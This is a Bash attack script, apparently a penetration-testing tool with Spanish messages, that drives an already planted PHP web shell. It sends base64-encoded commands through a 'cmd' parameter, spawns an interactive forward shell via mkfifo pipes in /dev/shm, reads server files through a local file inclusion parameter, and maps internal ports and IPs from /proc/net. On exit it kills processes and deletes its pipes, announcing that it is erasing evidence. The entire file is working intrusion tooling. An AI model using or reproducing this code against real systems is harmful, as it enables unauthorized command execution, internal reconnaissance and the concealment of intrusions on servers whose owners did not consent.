#!/bin/bash
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  erase_shell "$pid_tty"
  echo -e "\n\n${redColour}[!]${endColour} ${turquoiseColour}Saliendo......${endColour}"
  exit 1
}

#Ctrl_c
trap ctrl_c INT

#Variables globales
function helpPanel(){
  echo -e "\n${blueColour}Usage:${endColour}\t${grayColour}scritp [url|-u|--url] [VALUES] OPTIONAL[-c|-u|-l|-p] [VALUES]${endColour}"
  echo -e "\n\t-c, --command <command>\t\t${grayColour}Execute a single command.${endColour}"
  echo -e "\t-u, --url <url>\t\t\t${grayColour}Url where is allocated malicious php file,if it is an \"LFI\" you must use the parameter -p.${endColour}"
  echo -e "\t-h, --help\t\t\t${grayColour}Show this panel and exit.${endColour}"
  echo -e "\t-l, --lfi-file <file>\t\t${grayColour}Display a specific file.${endColour}"
  echo -e "\t-p, --param <param>\t\t${grayColour}Parameter where the \"LFI\" takes place.${endColour}"
  exit 1
}

script_args=()
scan=0
while [ $OPTIND -le "$#" ];do
if getopts ":u:c:l:p:sh-:" arg;then
  #echo "$arg" ver parametros
  case $arg in
    u) url=$OPTARG;;
    h) helpPanel;;
    c) command=$OPTARG;;
    -)
      case "$OPTARG" in
        url)
          url="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
          ;;
        url=*)
          url=${OPTARG#*=}
          opt=${OPTARG%=$url};;
        url:*)
          url=${OPTARG#*:}
          opt=${OPTARG%:$url}
          ;;
        command)
          command="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
          ;;
        command=*)
          command=${OPTARG#*=}
          opt=${OPTARG%=$command}
          ;;
        command:*)
          command=${OPTARG#*:}
          opt=${OPTARG%:$command}
          ;;
        help)
          helpPanel;;
        lfi-file)
          lfi_file="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
          ;;
        lfi-file=*)
          lfi_file=${OPTARG#*=}
          opt=${OPTARG%=$lfi_file}
          ;;
        lfi-file:*)
          lfi_file=${OPTARG#*:}
          opt=${OPTARG%:$lfi_file}
          ;;
        param)
          param="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
          ;;
        param=*)
          param=${OPTARG#*=}
          opt=${OPTARG%=$param}
          ;;
        param:*)
          param=${OPTARG#*:}
          opt=${OPTARG%:$param}
          ;;
        scan)
          scan=1;;
        *)
          if [ "$OPTERR" = 1 ] && [ "${optspec:0:1}" != ":" ]; then
            echo -e "${redColour}Unknown option${endColour} ${grayColour}--${OPTARG}${endColour}" >&2
            helpPanel
          fi
      esac;;
      l)lfi_file=$OPTARG;;
      p)param=$OPTARG;;
      s)scan=1;;
      \?)echo -e "${redColour}Unknown option${endColour} ${grayColour}-${OPTARG}${endColour}"
        helpPanel;;
      \:)echo "Usage" 
        helpPanel;;
  esac
else
  script_args+=("${!OPTIND}"); ((OPTIND++))
fi
done


if [ "${#script_args[@]}" -ne 1 ] && [ -z "$url" ];then
  helpPanel
else
  url="${script_args[0]}"
fi
random_num1=$(head -2 /dev/urandom | md5sum | grep -oP "\d" | xargs | tr -d ' ' | grep -oP '\d{7}' | head -n1 )
random_num2=$(head -2 /dev/urandom | md5sum | grep -oP "\d" | xargs | tr -d ' ' | grep -oP '\d{7}' | head -n1 )
input_dir="/dev/shm/input.$random_num1"
output_dir="/dev/shm/output.$random_num2"



#recibe el comando 
function execute_command(){
  b64_command=$(echo $1 | base64 -w 0)
  curl -s --get "$url" --data-urlencode "cmd=echo $b64_command | base64 -d > $input_dir" 
  curl -s --get "$url" --data-urlencode "cmd=cat $output_dir"
}

function no_interactive_command(){
  b64_command=$(echo $1 | base64 -w 0)
  curl -s --get "$url" --data-urlencode "cmd=echo $b64_command | base64 -d |sh ;disown "
  exit 0 
}

function create_shell(){
  echo -e "\n${greenColour}[+]${endColour} ${grayColour}Spawning Shell${endColour}"
  mkfifo_spawn="mkfifo $input_dir; tail -f $input_dir | /bin/bash 2>&1 > $output_dir"
  b64_mkfifo=$(echo $mkfifo_spawn | base64 -w 0)
  curl -s --get "$url" --data-urlencode "cmd=echo $b64_mkfifo | base64 -d |bash"
}



function erase_shell(){
  rm_stdin="/bin/rm $input_dir"
  rm_stdout="/bin/rm $output_dir"
  
  
  kill_mkfifo="for pid in \$(ps o pid= |sort);do kill -9 \$pid;done"
  curl -s --get "$url" --data-urlencode "cmd=echo '$kill_mkfifo' > $input_dir"
  curl -s --get "$url" --data-urlencode "cmd=kill -9 $1"
  curl -s --get "$url" --data-urlencode "cmd=$rm_stdin"
  curl -s --get "$url" --data-urlencode "cmd=$rm_stdout"
  echo -e "\n${blueColour}[-]${endColour} ${grayColour}Eliminando Evidencias......${endColour}"

  sleep 1
}

function searchfile(){
  sleep 1
  curl -s "$url?$param=$1"
}

echo "$lfi_file $param $command $scan"

if [ -n "$command" ] && [ "$scan" -eq 0 ] && [ -z "$param" ] && [ -z "$lfi_file" ];then
  result=$(no_interactive_command "$command")
  if [ -n "$result" ];then
    echo -e "${grayColour}$result${endColour}" 
  else
    echo -e "${redColour}[-]${endColour} ${turquoiseColour}Command not found${endColour}"
  fi
  exit 0
elif [ -n "$lfi_file" ] && [ -n "$param" ] && [ -z "$command" ] && [ "$scan" -eq 0 ];then

  echo -e "${greenColour}[+]${endColour} Finding File $url"
  result=$(searchfile "$lfi_file")
  if [ -n "$result" ];then
    echo -e "${grayColour}$result${endColour}"
  else
    echo -e "${redColour}[-]${endColour} ${turquoiseColour}File not found${endColour}"
  fi
  exit 0
elif [ "$scan" -eq 1 ] && [ -z "$param" ] && [ -z "$command" ] && [ -z "$lfi_file" ];then
  echo -e "${greenColour}[+]${endColour} Finding File /proc/net/tcp"
  echo -e "${yellowColour}[!]${endColour} ${turquoiseColour}Finding Open Internal Ports${endColour}" 
  
  for i in $(searchfile "/proc/net/tcp" | awk '{print $2}' | grep -v local_addres );do
    port=$(echo $i | awk '{print $2}' FS=":")
    echo -e "\t${blueColour}[+]${endColour} ${grayColour}Port${endColour} ${purpleColour}$((16#$port))${endColour} ${grayColour}Open${endColour}"
  done
  echo -e "${greenColour}[+]${endColour} Finding File /proc/net/fib_trie"
  echo -e "${yellowColour}[!]${endColour} ${turquoiseColour} Finding Open Internal IPs${endColour}"
  for ip in $(searchfile "/proc/net/fib_trie" | awk '/32 host/ { print f } {f=$2}' | sort -u);do
    echo -e "\t${blueColour}[+]${endColour}${purpleColour} $ip${endColour}"
  done
  exit 0
elif [ -z "$param" ] && [ "$scan" -eq 0 ] && [ -z "$command" ] && [ -n "$url" ] && [ -z "$lfi_file" ];then
  
  create_shell & &>/dev/null
  sleep 2
  echo -e "\n${greenColour}[+]${endColour} ${grayColour}We Interactive Got Interactive Shell${endColour}${blueColour}!${endColour}"
  pid_tty="$(execute_command 'echo $$')"
  #execute_command 'script /dev/null -c bash'
  #execute_command 'export TERM=xterm'
  #execute_command 'clear'
  #si se ejecuta un exit para salir de la tty hecha con mkfifo, va a quedar un proceso corriendo
  while read -p ">" -r command;do
    #echo -en "${grayColour}>${endColour}" && read -r command
    if [[ "$command" =~ ^( *exit)(;|&&|&| *| .*)*$ ]];then
      #exit_value=$(execute_command 'tty')
      exit_value=$(execute_command 'tty' | tail -n1)
      echo $exit_value
      if [ "$exit_value" == "not a tty" ];then 
        echo -e "\n${redColour}[!]${endColour} ${turquoiseColour}Use Ctrl+c to exit${endColour}" 
      else
        execute_command "$command"
      fi
    else
      execute_command "$command"
    fi

  done
  sleep 1
  erase_shell "$pid_tty"
  exit 0
else
  helpPanel
fi


